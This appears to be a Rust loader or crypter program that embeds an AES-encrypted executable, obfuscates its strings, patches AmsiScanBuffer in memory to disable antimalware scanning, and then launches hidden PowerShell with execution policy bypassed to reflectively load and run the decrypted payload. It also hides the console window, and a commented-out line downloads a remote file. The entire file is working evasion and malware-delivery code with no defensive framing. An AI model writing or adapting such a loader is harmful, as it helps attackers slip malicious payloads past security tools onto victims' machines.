use std::os::windows::process::CommandExt;
use base64;
use include_crypt::{EncryptedFile, include_crypt, obfstr::obfconst};
use obfstr::obfstr;
use std::process::Command;
use std::{ffi::CString, process, ptr};

use winapi::{
    um::{
        memoryapi::{
            VirtualProtect,
            WriteProcessMemory
        },
        libloaderapi::{
            LoadLibraryA,
            GetProcAddress
        },
        processthreadsapi::GetCurrentProcess,
        winnt::PAGE_READWRITE
    },
    shared::{
        minwindef::{
            DWORD,
            FALSE
        },
        ntdef::NULL
    }
};

fn xref() -> &'static EncryptedFile {
    static FILE: EncryptedFile = include_crypt!(AES,"C:\\Users\\JaxLa\\Desktop\\Jlaive.exe");
    obfstr::xref!(&FILE)
}

fn patch() {

    unsafe {
        // Credits to https://github.com/trickster0/OffensiveRust/tree/master/amsi_bypass
        let patch = [0x40, 0x40, 0x40, 0x40, 0x40, 0x40];
        let amsi_dll = LoadLibraryA(CString::new(obfstr!("amsi")).unwrap().as_ptr());
        let amsi_scan_addr = GetProcAddress(amsi_dll, CString::new(obfstr!("AmsiScanBuffer")).unwrap().as_ptr());
        let mut old_permissions: DWORD = 0;

        // Overwrite this address with nops.
        if VirtualProtect(amsi_scan_addr.cast(), 6, PAGE_READWRITE, &mut old_permissions) == FALSE {
            panic!("{}", obfstr!("[-] Failed to change protection."));
        }
        let written: *mut usize = ptr::null_mut();

        if WriteProcessMemory(GetCurrentProcess(), amsi_scan_addr.cast(), patch.as_ptr().cast(), 6, written) == FALSE {
            panic!("{}", obfstr!("[-] Failed to overwrite function."));
        }

        // Restoring the permissions.
        VirtualProtect(amsi_scan_addr.cast(), 6, old_permissions, &mut old_permissions);
        //println!("{}", obfstr!("[+] AmsiScanBuffer patched!"));

    }
}

fn hide_console_window() {
    use std::ptr;
    use winapi::um::wincon::GetConsoleWindow;
    use winapi::um::winuser::{ShowWindow, SW_HIDE};

    let window = unsafe {GetConsoleWindow()};
    // https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow
    if window != ptr::null_mut() {
        unsafe {
            ShowWindow(window, SW_HIDE);
        }
    }
}

fn main() {

    //  use litcrypt::{lc, use_litcrypt};
    //  use reqwest;
    //  let bytes =  reqwest::blocking::get(obfstr!("https://example.com/file.exe)).unwrap().bytes();
    let script = obfstr!("[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(\"").to_owned() + base64::encode(xref().decrypt()).as_str() + obfstr!("\")).EntryPoint.Invoke($null, $null)");
        patch();
        if let Ok(command) = Command::new("powershell")
            .arg("-NoProfile")
            .arg("-WindowStyle")
            .arg("Hidden")
            .arg("-ExecutionPolicy")
            .arg("Bypass")
            .arg("-Command")
            .arg(script)
           // .creation_flags(0x00000001) //attach debugger
            .output()
        {
            println!("{}",obfstr!("success!"));
            hide_console_window()
        }
}
//